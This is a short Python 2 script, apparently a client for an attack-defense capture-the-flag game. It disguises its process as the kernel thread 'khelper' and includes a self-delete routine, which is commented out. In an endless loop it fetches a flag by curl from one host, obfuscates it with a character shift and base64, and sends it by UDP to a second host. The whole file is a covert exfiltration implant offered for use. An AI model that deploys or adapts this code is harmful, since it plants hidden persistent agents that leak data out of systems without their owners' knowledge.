#!/usr/bin/python
import socket
import sys
import os
import time
import base64
import multiprocessing

def set_proc_name(newname):
    from ctypes import cdll, byref, create_string_buffer
    libc = cdll.LoadLibrary('libc.so.6')
    buff = create_string_buffer(len(newname)+1)
    buff.value = newname
    libc.prctl(15, byref(buff), 0, 0, 0)

def self_remove():
    filepath=os.path.abspath(sys.argv[0])
    #print filepath
    os.remove(filepath)

def encode(s):
    s=s[:-7]+chr(ord(s[-7])+1)+s[-6:-5]+chr(ord(s[-5])+1)+s[-4:-3]+chr(ord(s[-3])+1)+s[-2:-1]+chr(ord(s[-1])+1)
    s=base64.b64encode(s)
    return s

#define two arguments
addr=('',55168)
flag_addr=''

args=sys.argv
#print len(args)
if len(args)!=3:
    print "Error!Usage is not correct!"
    print "Usage:python client.py server_ip flag_ip"
    exit(-1)
else:
    addr=(args[1],55168)
    flag_addr=args[2]



if __name__=='__main__':
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            set_proc_name('khelper')
            #self_remove()
        except Exception as e:
            print e.message
            #pass
        while 1:
            data=''
            try:
                data=os.popen('curl http://'+flag_addr+'/getFlag').read()
            except Exception as e:
                #print e
                data=e.message
                #time.sleep(20)
            try:
                data=encode(data)
                #print data
                s.sendto(data,addr)
            except:
                pass
            time.sleep(10)
        s.close()
